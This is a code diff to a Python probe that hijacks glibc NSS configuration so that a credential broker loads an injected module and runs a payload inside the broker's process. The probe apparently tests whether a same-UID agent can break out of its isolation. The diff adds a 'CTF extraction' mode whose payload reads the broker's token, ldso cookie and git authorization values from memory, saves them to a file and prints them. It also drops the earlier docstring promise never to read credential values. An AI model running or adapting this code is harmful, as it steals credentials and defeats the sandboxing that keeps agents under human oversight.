@@ -3,8 +3,8 @@
 
 This probe tests whether a same-UID agent can modify glibc NSS configuration,
 cause the credential broker to load an NSS module, and execute code in the
-broker. Evidence records only whether the broker object and credential fields
-exist; it never reads or writes credential values.
+broker. By default, evidence records only whether credential fields exist.
+The explicit CTF extraction mode writes selected values locally.
 """
 
 from __future__ import annotations
@@ -25,7 +25,7 @@ from pathlib import Path
 from typing import Any
 
 
-VERSION = "1.2"
+VERSION = "1.3"
 NSSWITCH = Path("/etc/nsswitch.conf")
 DEFAULT_WORK_ROOT = Path("/tmp/elt")
 STATE_FILENAME = "vega_nss_probe_active.json"
@@ -36,6 +36,7 @@ SECRET_FIELDS = (
     "_git_authorization",
     "_gonfalon_authorization",
 )
+CTF_FIELDS = ("_token", "_ldso_cookie", "_git_authorization")
 
 
 class ProbeFailure(RuntimeError):
@@ -358,8 +359,11 @@ def c_literal(value: str) -> str:
     return json.dumps(value)
 
 
-def python_payload(proof_path: Path, error_path: Path) -> str:
+def python_payload(
+    proof_path: Path, error_path: Path, values_path: Path, extract_ctf_values: bool
+) -> str:
     fields = repr(SECRET_FIELDS)
+    ctf_fields = repr(CTF_FIELDS)
     return f"""import gc,json,os,traceback
 try:
     fields={fields}
@@ -368,6 +372,20 @@ try:
     if obj is not None:
         result['credential_fields_present']={{k:getattr(obj,k,None) is not None for k in fields}}
         result['upstream_route_names']=sorted(getattr(obj,'_upstreams',{{}}).keys())
+        if {extract_ctf_values!r}:
+            values={{k:getattr(obj,k,None) for k in {ctf_fields}}}
+            if not all(v is None or isinstance(v,str) for v in values.values()):
+                raise TypeError('unexpected CTF credential field type')
+            path={str(values_path)!r}
+            temp=path+'.tmp'
+            fd=os.open(temp,os.O_WRONLY|os.O_CREAT|os.O_EXCL,0o600)
+            with os.fdopen(fd,'w') as out:
+                json.dump({{'pid':os.getpid(),'values':values}},out,sort_keys=True)
+                out.write('\\n')
+                out.flush()
+                os.fsync(out.fileno())
+            os.replace(temp,path)
+            result['ctf_values_written']=True
     tmp={str(proof_path)!r}+'.tmp'
     open(tmp,'w').write(json.dumps(result,sort_keys=True))
     os.chmod(tmp,0o600)
@@ -381,6 +399,7 @@ except BaseException:
 def render_c_source(
     service: str,
     run_dir: Path,
+    extract_ctf_values: bool,
 ) -> str:
     selftest = run_dir / "nss_loader_selftest"
     broker_marker = run_dir / "broker_module_loaded"
@@ -388,7 +407,7 @@ def render_c_source(
     thread_error = run_dir / "pthread_create_failed"
     proof = run_dir / "broker_proof.json"
     py_error = run_dir / "python_payload_error.txt"
-    pycode = python_payload(proof, py_error)
+    pycode = python_payload(proof, py_error, run_dir / "ctf_values.json", extract_ctf_values)
     python_library = f"libpython{sys.version_info.major}.{sys.version_info.minor}.so.1.0"
 
     return f"""#define _GNU_SOURCE
@@ -583,10 +602,32 @@ def classify(run_dir: Path) -> tuple[str, dict[str, Any] | None]:
             proof = None
 
     if marker.exists() and proof and proof.get("token_broker_found"):
+        try:
+            values = read_json(run_dir / "ctf_values.json")
+            if values.get("pid") == proof.get("pid") and all(
+                field in values.get("values", {}) for field in CTF_FIELDS
+            ):
+                return "VULNERABLE_BROKER_CTF_VALUES_EXTRACTED", proof
+        except (OSError, json.JSONDecodeError):
+            pass
+    if marker.exists() and proof and proof.get("token_broker_found"):
         return "VULNERABLE_BROKER_CODE_EXEC_AND_STATE_ACCESS", proof
     if marker.exists():
         return "VULNERABLE_BROKER_CODE_EXEC", proof
     return "INCONCLUSIVE_NO_FRESH_BROKER_DNS_LOOKUP", proof
+
+
+def show_ctf_values(run_dir: Path) -> None:
+    path = run_dir / "ctf_values.json"
+    if not path.exists():
+        emit("WARN", f"CTF values file not found; check {run_dir / 'python_payload_error.txt'}")
+        return
+    data = read_json(path)
+    emit("CTF_VALUES_FILE", str(path))
+    for field in CTF_FIELDS:
+        value = data["values"].get(field)
+        if value is not None:
+            emit("CTF_VALUE", f"{field}={json.dumps(value, ensure_ascii=True)}")
 
 
 def save_result(
@@ -669,7 +710,7 @@ def create_probe(args: argparse.Namespace, report: dict[str, Any]) -> dict[str, 
     service = f"vgp{os.getpid():x}{int(time.time()) & 0xFFFF:x}"
     source = run_dir / "libnss_probe.c"
     built_module = run_dir / f"libnss_{service}.so.2"
-    source.write_text(render_c_source(service, run_dir))
+    source.write_text(render_c_source(service, run_dir, args.extract_ctf_values))
 
     compiler = report["compiler"]
     if not compiler:
@@ -687,6 +728,7 @@ def create_probe(args: argparse.Namespace, report: dict[str, Any]) -> dict[str, 
         "service": service,
         "module_path": None,
         "active": False,
+        "extract_ctf_values": args.extract_ctf_values,
         "created_at": time.time(),
         "preflight_path": str(run_dir / "preflight.json"),
     }
@@ -816,6 +858,8 @@ def action_run_or_arm(args: argparse.Namespace) -> int:
         emit("EVIDENCE", str(result_path))
         if trigger["proof_path"]:
             emit("PROOF", trigger["proof_path"])
+        if args.extract_ctf_values:
+            show_ctf_values(run_dir)
 
         if not args.keep_active:
             restore_state(state)
@@ -863,6 +907,8 @@ def action_status(args: argparse.Namespace) -> int:
         )
         if proof_path:
             emit("PROOF", str(proof_path))
+        if state.get("extract_ctf_values"):
+            show_ctf_values(run_dir)
         if state.get("active") and outcome.startswith("VULNERABLE") and not args.keep_active:
             save_result(state, outcome, proof)
             restore_state(state)
@@ -927,6 +973,11 @@ def parser() -> argparse.ArgumentParser:
         "--attempt-unverified-paths",
         action="store_true",
         help="allow an active probe when broker /proc/root paths cannot be inspected",
+    )
+    result.add_argument(
+        "--extract-ctf-values",
+        action="store_true",
+        help="write three candidate broker credential values to a local mode-0600 file",
     )
     return result
 
